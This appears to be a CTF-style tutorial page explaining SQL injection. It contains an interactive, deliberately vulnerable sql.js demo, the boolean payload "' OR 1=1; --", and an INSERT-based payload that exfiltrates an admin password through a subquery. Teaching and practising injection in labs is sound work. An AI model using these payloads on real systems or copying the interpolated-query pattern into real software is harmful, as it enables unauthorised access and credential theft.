---
title: sql injection
lastUpdated: May 2023
---

<script lang="ts">
  import Prism from 'prismjs';
	import 'prismjs/components/prism-sql';
  import initSqlJs from 'sql.js';
  import { onMount } from 'svelte';
  let db;
  let boolPassword = "";
  let boolSolveState: "" | "solved" | "wrong" | "error" = ""
  onMount(async () => {
    const SQL = await initSqlJs({
      locateFile: file => `https://sql.js.org/dist/${file}`
    });
    db = new SQL.Database();

    db.run(`CREATE TABLE bool_injection (username VARCHAR, password VARCHAR);
    INSERT INTO bool_injection (username, password) VALUES ('admin', 'this_is_a_secure_password_that_you_shouldnt_crack_or_look_at_source_for_use_the_SQL_injection_ty');`);
  });

  const runBoolDemo = () => {
    try {
      const res = db.exec(`SELECT * FROM bool_injection WHERE username = 'admin' AND password = '${boolPassword}'`);
      console.log(res);
      if (res.length > 0 && res[0].values.length > 0) {
        boolSolveState = "solved";
      } else {
        boolSolveState = "wrong";
      }
    } catch (e) {
      boolSolveState = "error";
      console.warn(e);
    }
  }
</script>

## What is SQL Injection?

![xkcd: exploits of a mom](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)
Most websites that need to store data often use SQL databases to store their data. When querying this database, you often need to include variables. Most SQL interfaces generally provide you a safe way of including variables into the query, but sometimes developers will not use these sanitized way of including variables.

```js
// Safely putting the variable productId into the query
client.query("SELECT product_name, price FROM products WHERE product_id = $1", [productId]);

// Unsafely putting the variable productId into the query by using string interpolation
client.query(`SELECT product_name, price FROM products WHERE product_id = ${productId};`);
```

If the variables are handled usafely, and you have control over the variables, you are able to preform a SQL Injection attack.

## Boolean Based SQL Injection

A boolean based SQL Injection is where you use boolean comparisions to match rows that generally wouldn't be matched. Try injecting some SQL to pass the following check.

<div class="py-8 font-sans text-center rounded-md not-prose width-full bg-zinc-800">
    <h1 class="mb-2 text-xl font-bold">Sign Up</h1>
    <input type="text" placeholder="Username" class="px-2 py-1 mb-2 rounded bg-zinc-500 text-zinc-400" disabled value="admin" />
    <br />
    <input type="text" placeholder="Password" class="px-2 py-1 mb-1 rounded bg-zinc-700 placeholder:text-zinc-400" bind:value={boolPassword} />
    <br />
    <button class="px-2 py-1 font-bold bg-purple-700 rounded hover:bg-purple-800 disabled:bg-purple-400 text-zinc-100" disabled={!db} on:click={runBoolDemo}>Sign Up</button>
</div>

<pre class="language-sql"><code class="language-sql">{@html Prism.highlight(`SELECT * FROM users WHERE username = 'admin' AND password = '${boolPassword}'`, Prism.languages['sql'], 'sql')}</code></pre>

<button class="px-2 py-1 font-bold rounded bg-emerald-700 hover:bg-emerald-800 text-zinc-100" on:click={()=>boolPassword="' OR 1=1; --"}>Solve</button>
{#if boolSolveState === "solved"}
<span class="text-green-500">solved!</span>
{:else if boolSolveState === "error"}
<span class="text-red-500">error.</span>
{:else if boolSolveState === "wrong"}
<span class="text-red-500">wrong!</span>
{:else}
{/if}

Because the database has a user with username admin and 1 = 1, the query selects the admin user meaning that the server would log us into the admin account, even though we don't know the admin password!

## Approaching a SQL Injection Challenge

Most of the time, challenges won't give you the query to look at. Instead you'll have to make a guess at what the SQL query looks like.

A good first step to solving any SQL Injection challenge is to write out what you think the query looks like. If a challenge looks something like this:

<div class="py-8 font-sans text-center rounded-md not-prose width-full bg-zinc-800">
    <h1 class="mb-2 text-xl font-bold">Sign Up</h1>
    <input type="text" placeholder="Username" class="px-2 py-1 mb-2 rounded bg-zinc-700 placeholder:text-zinc-400" />
    <br />
    <input type="text" placeholder="Password" class="px-2 py-1 mb-1 rounded bg-zinc-700 placeholder:text-zinc-400" />
    <br />
    <button class="px-2 py-1 font-bold bg-purple-700 rounded hover:bg-purple-800 text-zinc-100">Sign Up</button>
</div>

You can make an educated guess that the sql query looks something like this:

```sql
INSERT INTO users (username, password) VALUES ('{username}', '{password}');
```

Let's say this challenge requires us to get the admin password, so if we make our username the admin password, we will be able to get the admin password.

### Formulating a working SQL query

The next step is to formulate a query that should do what you want it to do. I found the best way to do this is a tool like [DB Fiddle](https://www.db-fiddle.com/) and setting up a mock database to test against.

You have control over the portions `{username}` and `{password}`. If we select the password of the admin user with a query like the following,

```sql
SELECT password FROM users WHERE username = 'admin'
```

Wrapping this in parentheses, and concatenating it with the empty string that we escaped means we can set the admin password to our username.

```
'||(SELECT password FROM users WHERE username = 'admin'), 'password'); --
```

Putting this into our username fields yields us the following query (formatted nicely for your convenience):

```sql
INSERT INTO users (username, password)
VALUES (
    ''||(SELECT password FROM users WHERE username = 'admin'),
    'password'
); -- ', '{password}');
```

This query will then insert a user with the username of the admin password and the password of password. Now if the table name isn't `users`, because we took an educated guess there, [we could get the table names](https://stackoverflow.com/questions/8334493/get-table-names-using-select-statement-in-mysql), find the correct table, then executing the query with that table in order to get our password.

// (note to self, this article should probably be rewritten to feel more like a list of notes than a tutorial)
